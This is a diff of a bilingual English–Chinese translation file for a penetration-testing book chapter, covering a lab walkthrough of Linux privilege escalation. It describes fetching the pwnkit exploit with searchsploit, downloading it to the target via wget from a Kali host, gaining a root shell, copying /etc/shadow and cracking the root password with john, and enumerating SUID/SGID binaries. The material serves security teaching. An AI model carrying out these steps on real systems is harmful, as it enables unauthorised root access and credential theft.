   prefs: []
   type: TYPE_PRE
+  zh: '[PRE5]'
 - en: The following screenshot shows this command output on the target system. It
     reveals that the target system is running Ubuntu Linux, kernel version **4.15.0-45-generic**
     , and the architecture is **x86_64** .
+  id: totrans-103
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下截图显示了该命令在目标系统上的输出。它揭示了目标系统正在运行 Ubuntu Linux，内核版本为**4.15.0-45-generic**，架构为**x86_64**。
 - en: '![Figure 11.12 – The command output shows essential information about the target
     operating system](image/B22229_11_12.jpg)'
+  id: totrans-104
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.12 – 命令输出显示目标操作系统的基本信息](image/B22229_11_12.jpg)'
 - en: Figure 11.12 – The command output shows essential information about the target
     operating system
+  id: totrans-105
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.12 – 命令输出显示目标操作系统的基本信息
 - en: 'To get specific operating system information, try the following commands:'
+  id: totrans-106
   prefs: []
   type: TYPE_NORMAL
+  zh: 要获取特定的操作系统信息，请尝试以下命令：
 - en: '[PRE6]'
+  id: totrans-107
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE6]'
 - en: 'The command output is shown on the target system:'
+  id: totrans-108
   prefs: []
   type: TYPE_NORMAL
+  zh: 目标系统上的命令输出如下：
 - en: '![Figure 11.13 – Enumerating operating system release information](image/B22229_11_13.jpg)'
+  id: totrans-109
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.13 – 枚举操作系统版本信息](image/B22229_11_13.jpg)'
 - en: Figure 11.13 – Enumerating operating system release information
+  id: totrans-110
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.13 – 枚举操作系统版本信息
 - en: 'Next, let’s take the information that we have about the target operating system
     and kernel version and check for privilege escalation exploits. In your Kali terminal,
     enter the following command:'
+  id: totrans-111
   prefs: []
   type: TYPE_NORMAL
+  zh: 接下来，我们将根据关于目标操作系统和内核版本的信息，检查是否有提权漏洞。在你的 Kali 终端中，输入以下命令：
 - en: '[PRE7]'
+  id: totrans-112
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE7]'
 - en: 'Here is the explanation:'
+  id: totrans-113
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下是解释：
 - en: '**searchsploit** : Allows you to search through exploits and shellcodes using
     one or more terms from **Exploit-DB**'
+  id: totrans-114
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**searchsploit** : 允许你使用一个或多个术语在**Exploit-DB**中搜索漏洞和 shellcode'
 - en: '**-s** : Strict search'
+  id: totrans-115
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**-s** : 严格搜索'
 - en: '**--id** : Displays the **EDB-ID** value rather than the local path'
+  id: totrans-116
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**--id** : 显示**EDB-ID**值，而不是本地路径'
 - en: 'The output of **searchsploit** is shown in the following figure:'
+  id: totrans-117
   prefs: []
   type: TYPE_NORMAL
+  zh: '**searchsploit**的输出如下图所示：'
 - en: '![Figure 11.14 – A demonstration of using searchsploit](image/B22229_11_14.jpg)'
+  id: totrans-118
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.14 – 使用 searchsploit 的演示](image/B22229_11_14.jpg)'
 - en: Figure 11.14 – A demonstration of using searchsploit
+  id: totrans-119
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.14 – 使用 searchsploit 的演示
 - en: Tip
+  id: totrans-120
   prefs: []
   type: TYPE_NORMAL
+  zh: 提示
 - en: I recommend that you explore the **searchsploit** **man** page. There are some
     really useful features, such as the ability to examine ( **-x** ) the content,
     and mirror ( **-m** ) the exploit to the current directory.
+  id: totrans-121
   prefs: []
   type: TYPE_NORMAL
+  zh: 我建议你查看**searchsploit**的**man**页面。这里有一些非常有用的功能，例如能够检查（**-x**）内容，并将漏洞镜像（**-m**）到当前目录。
 - en: 'Based on the kernel version and knowledge that the target is running Ubuntu
     **18.04** , we should look into the **polkit** / **pwnkit** exploits ( **CVE-2021-4034**
     ). This vulnerability was patched in the **polkit** version **0.120** . The following
     figure shows the **searchsploit** command output for this vulnerability:'
+  id: totrans-122
   prefs: []
   type: TYPE_NORMAL
+  zh: 基于内核版本和目标系统运行 Ubuntu **18.04** 的知识，我们应该研究**polkit** / **pwnkit** 漏洞（**CVE-2021-4034**）。该漏洞已在**polkit**版本**0.120**中修复。以下图示为此漏洞的**searchsploit**命令输出：
 - en: '![Figure 11.15 – The searchsploit results for the polkit exploit](image/B22229_11_15.jpg)'
+  id: totrans-123
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.15 – searchsploit 搜索结果显示 polkit 漏洞](image/B22229_11_15.jpg)'
 - en: Figure 11.15 – The searchsploit results for the polkit exploit
+  id: totrans-124
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.15 – searchsploit 搜索结果显示 polkit 漏洞
 - en: 'We can enumerate the **polkit** version using the following command:'
+  id: totrans-125
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们可以使用以下命令列举**polkit**版本：
 - en: '[PRE8]'
+  id: totrans-126
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE8]'
 - en: 'The output shown in the following figure reveals that the target **polkit**
     version is vulnerable:'
+  id: totrans-127
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下图所示的输出显示目标系统的**polkit**版本存在漏洞：
 - en: '![Figure 11.16 – The pkexec --version command reveals that the target is vulnerable](image/B22229_11_16.jpg)'
+  id: totrans-128
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.16 – pkexec --version 命令揭示目标系统存在漏洞](image/B22229_11_16.jpg)'
 - en: Figure 11.16 – The pkexec --version command reveals that the target is vulnerable
+  id: totrans-129
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.16 – pkexec --version 命令揭示目标系统存在漏洞
 - en: Before we attempt to exploit this, we check to ensure that the GCC compiler
     is installed using the **which gcc** command. We find that it is installed.
+  id: totrans-130
   prefs: []
   type: TYPE_NORMAL
+  zh: 在尝试利用漏洞之前，我们使用**which gcc**命令检查是否安装了GCC编译器。我们发现它已经安装。
 - en: We run the **searchsploit -m 50689** command, which copies the exploit code
     to our current directory. Examining the text of this file, we find that it contains
     code for two files, **evil-so.c** and **exploit.c** .
+  id: totrans-131
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们运行**searchsploit -m 50689**命令，将漏洞代码复制到当前目录。检查该文件的文本，我们发现它包含两个文件的代码，**evil-so.c**和**exploit.c**。
 - en: Important note
+  id: totrans-132
   prefs: []
   type: TYPE_NORMAL
+  zh: 重要提示
 - en: Never blindly run exploit code and third-party scripts unless you first review
     the source code to verify that there’s nothing malicious in it that will exploit
     your or your customer’s system in unintended ways!
+  id: totrans-133
   prefs: []
   type: TYPE_NORMAL
+  zh: 在未经检查源代码并确认其中没有恶意内容之前，绝对不要盲目运行漏洞代码和第三方脚本，以免以意外方式利用你或你客户的系统！
 - en: Since the source of this exploit code comes from *Exploit-DB* ( **searchsploit**
     ), it’s safe to use because **Offensive Security** reviews exploit submissions
     before they are posted.
+  id: totrans-134
   prefs: []
   type: TYPE_NORMAL
+  zh: 由于这个漏洞代码的来源是*Exploit-DB*（**searchsploit**），它是安全的，因为**Offensive Security**在发布漏洞提交之前会对其进行审核。
 - en: 'We can transfer exploits and scripts over to the target system. On the Kali
     system, make a new directory ( **mkdir** ) named **share** . We never want to
     share our home directory or any location where we may have sensitive information
     to the network. Change directory to **share** ( **cd share** ), copy any exploits
     or scripts to this directory, then start a Python HTTP server as follows: **python3
     -** **m http.server** .'
+  id: totrans-135
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们可以将漏洞和脚本传输到目标系统。在 Kali 系统上，创建一个名为**share**的新目录（**mkdir**）。我们永远不希望将我们的主目录或包含敏感信息的任何位置共享到网络。切换到**share**目录（**cd
+    share**），将任何漏洞或脚本复制到该目录，然后启动一个 Python HTTP 服务器，命令如下：**python3 -m http.server**。
 - en: On the target system, change directory to **/tmp** ( **cd /tmp** ). This directory
     is writable by all users. The **/dev/shm** directory is also usually writable
     by all users. Then, transfer the file from Kali using the **wget http://192.168.56.11:8000/filename**
     command. Of course, be sure to change the IP address and filename to values appropriate
     for your system. Don’t forget to make your exploits or scripts executable ( **chmod
     +x** ) before you run them!
+  id: totrans-136
   prefs: []
   type: TYPE_NORMAL
+  zh: 在目标系统上，切换到**/tmp**目录（**cd /tmp**）。该目录对所有用户是可写的。**/dev/shm**目录通常也对所有用户是可写的。然后，使用**wget
+    http://192.168.56.11:8000/filename**命令从 Kali 传输文件。当然，请确保根据你的系统修改IP地址和文件名。在运行之前，别忘了使你的漏洞或脚本可执行（**chmod
+    +x**）！
 - en: 'On the target system, compile the exploits, as shown in the following figure:'
+  id: totrans-137
   prefs: []
   type: TYPE_NORMAL
+  zh: 在目标系统上，按照下图所示编译漏洞代码：
 - en: '![Figure 11.17 – Compiling the polkit exploit code](image/B22229_11_17.jpg)'
+  id: totrans-138
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.17 – 编译 polkit 漏洞代码](image/B22229_11_17.jpg)'
 - en: Figure 11.17 – Compiling the polkit exploit code
+  id: totrans-139
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.17 – 编译 polkit 漏洞代码
 - en: 'The output in the preceding figure is only warnings, and we check the files
     using the **ls -l** command and see that they are, in fact, compiled. We change
     the permissions to make them executable by running the **chmod +x filename** command,
     and then run the exploit. The following figure shows the exploit in action:'
+  id: totrans-140
   prefs: []
   type: TYPE_NORMAL
+  zh: 上图中的输出只是警告，我们使用**ls -l**命令检查文件，发现它们实际上已经被编译。我们通过运行**chmod +x filename**命令更改文件权限，使其可执行，然后运行该漏洞。以下图展示了漏洞的实际操作：
 - en: '![Figure 11.18 – Running the polkit exploit results in a root shell](image/B22229_11_18.jpg)'
+  id: totrans-141
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.18 – 运行 polkit 漏洞代码后获得 root shell](image/B22229_11_18.jpg)'
 - en: Figure 11.18 – Running the polkit exploit results in a root shell
+  id: totrans-142
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.18 – 运行 polkit 漏洞代码后获得 root shell
 - en: 'While we have elevated privileges as **root** , we need to establish some form
     of persistence. I **cat** the **/etc/shadow** file, which contains password hashes,
     and then save a copy to my Kali system. I then attempt to crack the hashes using
@@ -614,324 +916,500 @@
     in the following figure, where we find that the **root** password is **12345**
     . Having the **root** password will allow us to continue accessing this system
     as **root** should we get disconnected:'
+  id: totrans-143
   prefs: []
   type: TYPE_NORMAL
+  zh: 尽管我们拥有 **root** 权限，但我们需要建立某种持久性。我 **cat** 了 **/etc/shadow** 文件，其中包含密码哈希，然后将副本保存到我的
+    Kali 系统。我随后尝试使用 **john shadow** 命令破解哈希。成功破解了 **root** 密码，如下图所示，我们发现 **root** 密码是
+    **12345**。拥有 **root** 密码后，如果我们断开连接，仍然可以继续以 **root** 身份访问该系统：
 - en: '![Figure 11.19 – Using john to crack the root password](image/B22229_11_19.jpg)'
+  id: totrans-144
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.19 – 使用 john 破解 root 密码](image/B22229_11_19.jpg)'
 - en: Figure 11.19 – Using john to crack the root password
+  id: totrans-145
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.19 – 使用 john 破解 root 密码
 - en: For the sake of learning, let’s continue as if we haven’t found this exploit
     and continue to enumerate the system for privilege escalation paths.
+  id: totrans-146
   prefs: []
   type: TYPE_NORMAL
+  zh: 为了学习目的，假设我们没有找到这个漏洞，我们将继续枚举系统中的权限提升路径。
 - en: 'Next, we need to test for writable directories in the path of **user6** . If
     any writable directories are found in our path, we may be able to hijack and replace
     their content. For this, we’ll use the following script, which can be found in
     this chapter’s GitHub repository as **ch11_checkpath.sh** :'
+  id: totrans-147
   prefs: []
   type: TYPE_NORMAL
+  zh: 接下来，我们需要测试 **user6** 路径中的可写目录。如果我们在路径中发现任何可写目录，可能就能劫持并替换其内容。为此，我们将使用以下脚本，该脚本可以在本章的
+    GitHub 仓库中找到，名为 **ch11_checkpath.sh**：
 - en: '[PRE9]'
+  id: totrans-148
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE9]'
 - en: The preceding code starts with the familiar shebang line. The **PATH** environment
     variable is expanded, then each colon is replaced with a newline to make the data
     into one directory per line. This data is then assigned to the **path_dirs** variable.
+  id: totrans-149
   prefs: []
   type: TYPE_NORMAL
+  zh: 上述代码以熟悉的 shebang 行开始。**PATH** 环境变量被展开，然后每个冒号都被替换为换行符，使数据变成每行一个目录。然后，这些数据被分配给
+    **path_dirs** 变量。
 - en: '[PRE10]'
+  id: totrans-150
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE10]'
 - en: The preceding code block checks each directory (recursively) if it is writable.
+  id: totrans-151
   prefs: []
   type: TYPE_NORMAL
+  zh: 上述代码块递归检查每个目录是否可写。
 - en: '[PRE11]'
+  id: totrans-152
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE11]'
 - en: The preceding code block loops through the list of directories in the **path_dir**
     variable and passes each one to the **check_permissions** function.
+  id: totrans-153
   prefs: []
   type: TYPE_NORMAL
+  zh: 上述代码块遍历 **path_dir** 变量中的目录列表，并将每个目录传递给 **check_permissions** 函数。
 - en: 'We run this script on the target, but no writable directories are discovered,
     as shown in the following figure:'
+  id: totrans-154
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们在目标上运行此脚本，但未发现任何可写目录，如下图所示：
 - en: '![Figure 11.20 – Checking for writable directories in PATH](image/B22229_11_20.jpg)'
+  id: totrans-155
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.20 – 检查 PATH 中的可写目录](image/B22229_11_20.jpg)'
 - en: Figure 11.20 – Checking for writable directories in PATH
+  id: totrans-156
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.20 – 检查 PATH 中的可写目录
 - en: 'Next, we check environment variables for credentials, keys, or any interesting
     data using the following command:'
+  id: totrans-157
   prefs: []
   type: TYPE_NORMAL
+  zh: 接下来，我们使用以下命令检查环境变量中是否包含凭据、密钥或其他有趣的数据：
 - en: '[PRE12]'
+  id: totrans-158
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE12]'
 - en: 'The output is as follows:'
+  id: totrans-159
   prefs: []
   type: TYPE_NORMAL
+  zh: 输出如下：
 - en: '![Figure 11.21 – Environment variables are displayed](image/B22229_11_21.jpg)'
+  id: totrans-160
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.21 – 显示的环境变量](image/B22229_11_21.jpg)'
 - en: Figure 11.21 – Environment variables are displayed
+  id: totrans-161
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.21 – 显示的环境变量
 - en: Unfortunately, we do not find any interesting data in the environment variables.
+  id: totrans-162
   prefs: []
   type: TYPE_NORMAL
+  zh: 不幸的是，我们在环境变量中没有找到任何有趣的数据。
 - en: 'Next, we’ll explore running processes. The **pspy** tool will allow us to monitor
     running processes without being the **root** user: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
     .'
+  id: totrans-163
   prefs: []
   type: TYPE_NORMAL
+  zh: 接下来，我们将探索正在运行的进程。**pspy** 工具允许我们在不是 **root** 用户的情况下监控运行的进程：[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)。
 - en: 'After transferring **pspy64** to the target system, we run it and see something
     interesting in the output, as shown in the following figure:'
+  id: totrans-164
   prefs: []
   type: TYPE_NORMAL
+  zh: 将 **pspy64** 转移到目标系统后，我们运行它，并在输出中看到了一些有趣的内容，如下图所示：
 - en: '![Figure 11.22 – Interesting executables running in the pspy64 output](image/B22229_11_22.jpg)'
+  id: totrans-165
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.22 – 在 pspy64 输出中运行的有趣可执行文件](image/B22229_11_22.jpg)'
 - en: Figure 11.22 – Interesting executables running in the pspy64 output
+  id: totrans-166
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.22 – 在 pspy64 输出中运行的有趣可执行文件
 - en: 'We examine these files in **/home/user4** and find that we do not have the
     ability to write to them, as seen in the following figure:'
+  id: totrans-167
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们检查了 **/home/user4** 中的这些文件，发现我们没有写入权限，如下图所示：
 - en: '![Figure 11.23 – Examining files in user4’s home directory](image/B22229_11_23.jpg)'
+  id: totrans-168
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.23 – 检查 user4 的家目录中的文件](image/B22229_11_23.jpg)'
 - en: Figure 11.23 – Examining files in user4’s home directory
+  id: totrans-169
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.23 – 检查 user4 的家目录中的文件
 - en: 'Finally, let’s check some common file permissions. Run the following commands
     on the target system:'
+  id: totrans-170
   prefs: []
   type: TYPE_NORMAL
+  zh: 最后，让我们检查一些常见的文件权限。在目标系统上运行以下命令：
 - en: '[PRE13]'
+  id: totrans-171
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE13]'
 - en: Of course, we don’t have any luck here and we can’t write to these files and
     can’t read password hashes from **/etc/shadow** , but it never hurts to check.
+  id: totrans-172
   prefs: []
   type: TYPE_NORMAL
+  zh: 当然，我们在这里并没有运气，我们无法写入这些文件，也无法从 **/etc/shadow** 读取密码哈希，但检查一下总没坏处。
 - en: This section gave a primer on common filesystem paths to check, and how to enumerate
     the kernel and operating system versions and search for working exploits. In the
     next section, we’ll explore SUID and SGID binaries and how they can be useful
     for privile ge escalation.
+  id: totrans-173
   prefs: []
   type: TYPE_NORMAL
+  zh: 本节提供了检查常见文件系统路径的入门，并介绍了如何枚举内核和操作系统版本，搜索有效的漏洞。下一节，我们将探索 SUID 和 SGID 二进制文件，以及它们如何用于特权升级。
 - en: Exploiting SUID and SGID binaries with Bash
+  id: totrans-174
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 使用 Bash 利用 SUID 和 SGID 二进制文件
 - en: SUID and SGID are special permissions in Unix-like systems that allow users
     to execute files with the permission of the file owner or group. When misused,
     these permissions can lead to privilege escalation. This section focuses on identifying
     and exploiting SUID/SGID binaries using Bash commands and scripts.
+  id: totrans-175
   prefs: []
   type: TYPE_NORMAL
+  zh: SUID 和 SGID 是类 Unix 系统中的特殊权限，允许用户以文件所有者或组的权限执行文件。当被滥用时，这些权限可能导致特权升级。本节将重点介绍如何使用
+    Bash 命令和脚本识别和利用 SUID/SGID 二进制文件。
 - en: In a previous chapter, you learned about Linux file permissions. Let’s have
     a quick recap and then build on that concept to understand SUID and SGID.
+  id: totrans-176
   prefs: []
   type: TYPE_NORMAL
+  zh: 在前面的章节中，你学习了 Linux 文件权限。让我们快速回顾一下，然后基于这个概念深入理解 SUID 和 SGID。
 - en: 'If we enter the **ls -l** command and view the output for the **shell.php**
     file, we fi nd the following:'
+  id: totrans-177
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果我们输入 **ls -l** 命令并查看 **shell.php** 文件的输出，我们会发现以下内容：
 - en: '[PRE14]'
+  id: totrans-178
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE14]'
 - en: 'Let’s break that down. The first character is always either **-** for a file
     or **d** for a directory. In the following figure, I have highlighted the file
     type. Since the file type in this figure is a dash ( **-** ), we know this is
     a file:'
+  id: totrans-179
   prefs: []
   type: TYPE_NORMAL
+  zh: 让我们来分解一下。第一个字符总是 **-** 表示文件，或者 **d** 表示目录。在下图中，我已突出显示文件类型。由于此图中的文件类型是一个破折号（**-**），我们知道这是一个文件：
 - en: '![Figure 11.24 – The file type is highlighted and shows it is a file, not a
     directory](image/B22229_11_24.jpg)'
+  id: totrans-180
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.24 – 文件类型已突出显示，显示它是一个文件，而不是目录](image/B22229_11_24.jpg)'
 - en: Figure 11.24 – The file type is highlighted and shows it is a file, not a directory
+  id: totrans-181
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.24 – 文件类型已突出显示，显示它是一个文件，而不是目录
 - en: 'In the following figure, the user permissions are highlighted. If you recall,
     when all three are set (read, write, and execute), they sum to **7** ( *4 + 2
     + 1 = 7* ). In this case, since the file is not executable, the user permissions
     sum to **6** ( *4 + 2 + 0 =* *6* ):'
+  id: totrans-182
   prefs: []
   type: TYPE_NORMAL
+  zh: 在下图中，用户权限已突出显示。如果你记得，当三个权限都设置时（读取、写入和执行），它们的总和为 **7** （*4 + 2 + 1 = 7*）。在这种情况下，由于文件不可执行，用户权限的总和为
+    **6** （*4 + 2 + 0 = 6*）：
 - en: '![Figure 11.25 – User permissions are highlighted](image/B22229_11_25.jpg)'
+  id: totrans-183
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.25 – 用户权限已突出显示](image/B22229_11_25.jpg)'
 - en: Figure 11.25 – User permissions are highlighted
+  id: totrans-184
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.25 – 用户权限已突出显示
 - en: 'Group permissions are examined in the following figure. The file is readable
     but not writeable or executable. The group permissions sum to **4** ( *4 + 0 +
     0 =* *4* ):'
+  id: totrans-185
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下图所示，检查了组权限。该文件可读取，但不可写入或执行。组权限的总和为 **4** （*4 + 0 + 0 = 4*）：
 - en: '![Figure 11.26 – Group permissions are highlighted](image/B22229_11_26.jpg)'
+  id: totrans-186
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.26 – 组权限已突出显示](image/B22229_11_26.jpg)'
 - en: Figure 11.26 – Group permissions are highlighted
+  id: totrans-187
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.26 – 组权限已突出显示
 - en: 'Other permissions are examined in the following figure. If you are not the
     user or a member of the group listed on the file permissions, then the *other*
     permissions apply:'
+  id: totrans-188
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下图所示，检查了其他权限。如果你不是文件权限中列出的用户或组成员，那么适用*其他*权限：
 - en: '![Figure 11.27 – Other permissions are highlighted](image/B22229_11_27.jpg)'
+  id: totrans-189
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.27 – 其他权限已突出显示](image/B22229_11_27.jpg)'
 - en: Figure 11.27 – Other permissions are highlighted
+  id: totrans-190
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.27 – 其他权限已突出显示
 - en: 'In the following figure, the **root** user is the file owner:'
+  id: totrans-191
   prefs: []
   type: TYPE_NORMAL
+  zh: 在下图中，**root** 用户是文件所有者：
 - en: '![Figure 11.28 – File user ownership is shown to be root](image/B22229_11_28.jpg)'
+  id: totrans-192
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.28 – 文件用户所有权显示为 root](image/B22229_11_28.jpg)'
 - en: Figure 11.28 – File user ownership is shown to be root
+  id: totrans-193
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.28 – 文件用户所有权显示为 root
 - en: 'The *root* group has group permissions on this file, as shown in the following
     figure:'
+  id: totrans-194
   prefs: []
   type: TYPE_NORMAL
+  zh: '*root* 组对该文件具有组权限，如下图所示：'
 - en: '![Figure 11.29 – Group ownership belongs to the root group](image/B22229_11_29.jpg)'
+  id: totrans-195
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.29 – 组所有权属于 root 组](image/B22229_11_29.jpg)'
 - en: Figure 11.29 – Group ownership belongs to the root group
+  id: totrans-196
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.29 – 组所有权属于 root 组
 - en: 'Linux special file permissions extend beyond the basic read, write, and execute
     permissions. Two key special permissions are the SUID and SGID bits:'
+  id: totrans-197
   prefs: []
   type: TYPE_NORMAL
+  zh: Linux 特殊文件权限超出了基本的读取、写入和执行权限。两个关键的特殊权限是 SUID 和 SGID 位：
 - en: '**SUID** : When applied to an executable file, SUID allows the file to run
     with the privileges of the file’s owner, rather than the user executing it. It’s
     represented by **s** in the owner’s execute permission field.'
+  id: totrans-198
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**SUID**：当应用于可执行文件时，SUID 使文件以文件拥有者的权限运行，而不是执行它的用户的权限。它在文件拥有者的执行权限字段中表示为 **s**。'
 - en: 'To set SUID, enter this command: **ch mod** **u+s filename** .'
+  id: totrans-199
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 要设置 SUID，请输入此命令：**chmod** **u+s filename**。
 - en: 'To set SUID using numeric representation, enter this command: **chmod** **4000
     filename** .'
+  id: totrans-200
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 要使用数字表示法设置 SUID，请输入此命令：**chmod** **4000 filename**。
 - en: 'When examining file permissions, the following figure demonstrates the permissions
     of a file with SUID:'
+  id: totrans-201
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 在检查文件权限时，下面的图展示了一个具有 SUID 权限的文件权限：
 - en: '![Figure 11.30 – File permissions reveal it is SUID](image/B22229_11_30.jpg)'
+  id: totrans-202
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.30 – 文件权限显示它是 SUID](image/B22229_11_30.jpg)'
 - en: Figure 11.30 – File permissions reveal it is SUID
+  id: totrans-203
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.30 – 文件权限显示它是 SUID
 - en: '**SGID** : SGID works similarly to SUID but for groups. When set on an executable,
     it runs with the privileges of the file’s group. On directories, it causes new
     files created within to inherit the group of the parent directory.'
+  id: totrans-204
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**SGID**：SGID 的工作方式类似于 SUID，但适用于组。当设置在可执行文件上时，它会以文件所属组的权限运行。在目录上设置时，它会使在该目录中创建的新文件继承父目录的组。'
 - en: 'To set SGID, enter this command: **chmod** **g+s filename** .'
+  id: totrans-205
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 要设置 SGID，请输入此命令：**chmod** **g+s filename**。
 - en: 'To set SGID using numeric representation, enter this command: **chmod** **2000
     filename** .'
+  id: totrans-206
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 要使用数字表示法设置 SGID，请输入此命令：**chmod** **2000 filename**。
 - en: 'When examining file permissions, the following figure demonstrates the permissions
     of a file with SGID:'
+  id: totrans-207
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 在检查文件权限时，下面的图展示了一个具有 SGID 权限的文件权限：
 - en: '![Figure 11.31 – File permissions reveal it is SGID](image/B22229_11_31.jpg)'
+  id: totrans-208
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.31 – 文件权限显示它是 SGID](image/B22229_11_31.jpg)'
 - en: Figure 11.31 – File permissions reveal it is SGID
+  id: totrans-209
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.31 – 文件权限显示它是 SGID
 - en: These permissions are relevant to privilege escalation in several ways. If a
     vulnerable SUID binary owned by **root** can be exploited, it may lead to privilege
     escalation. SGID is similar to SUID, except escalating to the privileges of a
     specific group. If an attacker can modify these binaries, they can insert malicious
     code to be executed with elevated privileges. Unnecessary SUID or SGID bits on
     executables increase the attack surface.
+  id: totrans-210
   prefs: []
   type: TYPE_NORMAL
+  zh: 这些权限在多个方面与权限提升相关。如果一个由 **root** 拥有的易受攻击的 SUID 二进制文件被利用，可能会导致权限提升。SGID 与 SUID
+    类似，只是它提升的是特定组的权限。如果攻击者能够修改这些二进制文件，他们可以插入恶意代码，以提升的权限执行。可执行文件上的不必要的 SUID 或 SGID
+    位增加了攻击面。
 - en: 'To find SUID and SGID binaries, use the following Bash commands:'
+  id: totrans-211
   prefs: []
   type: TYPE_NORMAL
+  zh: 要查找 SUID 和 SGID 二进制文件，请使用以下 Bash 命令：
 - en: '[PRE15]'
+  id: totrans-212
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE15]'
 - en: These commands search the entire filesystem starting at the top level **/**
     for files ( **-type f** ) with SUID ( **-u=s** ) or SGID ( **-g=s** ) bits set.
     The **2>/dev/null** expression redirects error messages to **/dev/null** , suppressing
     permission-denied errors. The **/dev/null** file is essentially a trashcan with
     a black hole at the bottom. Anything that is sent to this special place is discarded.
+  id: totrans-213
   prefs: []
   type: TYPE_NORMAL
+  zh: 这些命令从顶级目录 **/** 开始，搜索整个文件系统，查找具有 SUID（**-u=s**）或 SGID（**-g=s**）位的文件（**-type
+    f**）。**2>/dev/null** 表达式将错误信息重定向到 **/dev/null**，从而抑制权限拒绝错误。**/dev/null** 文件实际上是一个垃圾桶，底部是一个黑洞。任何发送到这个特殊位置的数据都会被丢弃。
 - en: 'Let’s run these commands on the target system and compare the output. The following
     figure shows the partial output of the command that searches for SUID files:'
+  id: totrans-214
   prefs: []
   type: TYPE_NORMAL
+  zh: 让我们在目标系统上运行这些命令并比较输出。下面的图展示了搜索 SUID 文件命令的部分输出：
 - en: '![Figure 11.32 – Partial output of a list of SUID files](image/B22229_11_32.jpg)'
+  id: totrans-215
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.32 – SUID 文件列表的部分输出](image/B22229_11_32.jpg)'
 - en: Figure 11.32 – Partial output of a list of SUID files
+  id: totrans-216
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.32 – SUID 文件列表的部分输出
 - en: 'In the output on the target system, there are two interesting matches found
     in the user’s home directories. This is shown in the following figure:'
+  id: totrans-217
   prefs: []
   type: TYPE_NORMAL
+  zh: 在目标系统的输出中，在用户的主目录下找到了两个有趣的匹配项。如下图所示：
 - en: '![Figure 11.33 – Specific SUID files from our search are examined](image/B22229_11_33.jpg)'
+  id: totrans-218
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.33 – 从我们的搜索中检查到的特定 SUID 文件](image/B22229_11_33.jpg)'
 - en: Figure 11.33 – Specific SUID files from our search are examined
+  id: totrans-219
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.33 – 从我们的搜索中检查到的特定 SUID 文件
